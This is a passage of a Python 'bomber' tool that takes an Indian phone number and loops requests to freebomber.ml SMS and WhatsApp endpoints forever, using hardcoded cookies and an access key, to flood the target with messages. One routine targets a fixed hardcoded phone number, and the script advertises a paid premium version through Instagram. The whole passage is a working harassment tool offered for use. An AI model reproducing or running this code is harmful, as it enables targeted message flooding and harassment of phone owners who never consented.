= input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)\n            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number98+r)\n            \n            def mixbimb():\n                cookies122 = {\n                    \'cf_clearance\': \'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150\',\n                    \'_pk_id.376245.6a19\': \'3f6ba316cc7c0364.1660033473.\',\n                }\n\n                headers122 = {\n                    \'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\',\n                    \'Accept\': \'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\',\n                    \'Accept-Language\': \'en-US,en;q=0.5\',\n                    \'Referer\': \'https://freebomber.ml/tk/mix/\',\n                    \'DNT\': \'1\',\n                    \'Connection\': \'keep-alive\',\n                    # Requests sorts cookies= alphabetically\n                    # \'Cookie\': \'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.\',\n                    \'Upgrade-Insecure-Requests\': \'1\',\n                    \'Sec-Fetch-Dest\': \'document\',\n                    \'Sec-Fetch-Mode\': \'navigate\',\n                    \'Sec-Fetch-Site\': \'same-origin\',\n                    \'Sec-Fetch-User\': \'?1\',\n                    \'Cache-Control\': \'max-age=0\',\n                    # Requests doesn\'t support trailers\n                    # \'TE\': \'trailers\',\n                }\n\n                params122 = {\n                    \'sr\': \'9528027588\',\n                    \'key\': \'@itztktricks\',\n                    \'submit\': \'Submit Query\',\n                }\n                response = requests.get(\'https://freebomber.ml/tk/mix/hard-bomber.php\', params=params122, cookies=cookies122, headers=headers122)\n            try:\n                while True:\n                    mixbimb()\n            except:\n                _under_()\n                chutmarike(\'Sms2 stopped ..\')\n                _under_()\n                sys.exit()\n        elif self.data_main==4:\n            chutmarike(\'Coming soon ..\')\n        elif self.data_main==5:\n            _cls_front_under()\n            chutmarike(\'For call , custom msg and fastest api buy the premium script ..\')\n            _under_()\n            chutmarike(\'To buy script contact me on instagram : @sincryptzork\')\n            sys.exit()\n            number9 = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the 10 Digit number +91 : "+r)\n            print(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mAttack Started on >> "+y+"+91"+number9+r)\n            \n            def whatsappbomb():\n                cookies45 = {\n                    \'cf_clearance\': \'ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150\',\n                    \'_pk_id.376245.6a19\': \'3f6ba316cc7c0364.1660033473.\',\n                }\n\n                headers45 = {\n                    \'User-Agent\': \'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0\',\n                    \'Accept\': \'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\',\n                    \'Accept-Language\': \'en-US,en;q=0.5\',\n                    \'Referer\': \'https://freebomber.ml/tk/whatsapp/\',\n                    \'DNT\': \'1\',\n                    \'Connection\': \'keep-alive\',\n                    # Requests sorts cookies= alphabetically\n                    # \'Cookie\': \'cf_clearance=ej05R5JA19ztAZQH0STVHkREtY1SwUTD747zRNsJBiM-1661065258-0-150; _pk_id.376245.6a19=3f6ba316cc7c0364.1660033473.\',\n                    \'Upgrade-Insecure-Requests\': \'1\',\n                    \'Sec-Fetch-Dest\': \'document\',\n                    \'Sec-Fetch-Mode\': \'navigate\',\n                    \'Sec-Fetch-Site\': \'same-origin\',\n                    \'Sec-Fetch-User\': \'?1\',\n                    \'Cache-Control\': \'max-age=0\',\n                    # Requests doesn\'t support trailers\n                    # \'TE\': \'trailers\',\n                }\n\n                params45 = {\n                    \'sr\': number9,\n                    \'key\': \'@itztktricks\',\n                    \'submit\': \'Submit Query\',\n                }\n\n                response45 = requests.get(\'https://freebomber.ml/tk/whatsapp/whatsapp-bomber.php\', params=params45, cookies=cookies45, headers=headers45)\n            try:\n                while True:\n                    whatsappbomb()\n            except:\n                _under_()\n                chutmarike(\'Whatsapp Bombing Stopped ..\')\n                _under_()\n                sys.exit()\n        elif self.data_main==6:\n            os.system(\'python update.py\' if os.name==\'nt\' else \'python3 update.py\')\n        elif self.data_main==7:\n            _under_()\n            chutmarike(\'Exiting ..\')\n            _under_()\n            sys.exit()\n\n    \ntry:\n    samayuser = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Username : "+r)\n    samaypassword = input(r+"\xe2\x94\x94\xe2\x94\x80"+w+"\\033[1;37mEnter the Password : "+r)\nexcept:\n    sys.exit()\n\n    \nif __name__ == \'__main__\':\n    bhai = Samay(samayuser,samaypassword)\n    bhai.Passwordencrypt()\n    \n    \n    \n\n        \n\n\n\n    \n\n\n# In[ ]:\n\n\n\n\n\n# In[ ]:\n\n\n\n\n'

